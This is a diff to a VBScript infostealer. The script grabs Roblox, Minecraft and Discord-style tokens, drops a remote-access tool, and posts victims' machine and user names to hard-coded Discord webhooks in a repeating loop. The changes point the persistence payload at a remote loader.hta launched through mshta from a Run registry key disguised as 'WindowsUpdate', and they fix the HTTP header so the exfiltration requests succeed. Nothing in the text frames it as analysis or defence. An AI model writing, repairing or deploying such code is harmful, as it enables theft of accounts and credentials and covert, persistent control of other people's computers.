@@ -9,14 +9,12 @@ Dim sh, fso, WH, WH_REG, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
 WH = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
 WH_REG = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- FIRST RUN (LOGS WEBHOOK) ---
 Call IP
 Call GrabRoblox
 Call GrabMinecraft
@@ -24,7 +22,6 @@ Call GrabTokens
 Call DropRAT
 Call Persistence
 
-' --- RE-GRAB LOOP (RE-GRAB WEBHOOK) ---
 Dim runCount
 For runCount = 1 To 4
     Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REG)
@@ -309,7 +306,7 @@ Sub DropRAT()
 End Sub
 
 Sub Persistence()
-    Dim payload : payload = "mshta https://lozixloggeduhahalmao-production.up.railway.app"
+    Dim payload : payload = "mshta https://lozixloggeduhahalmao-production.up.railway.app/loader.hta"
     On Error Resume Next
 
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -354,7 +351,7 @@ Sub PostEmbed(t, d, c, url)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", url, False
-    h.SetRequestHeader "Content-Type" & Chr(58) & " application/json"
+    h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
 End Sub
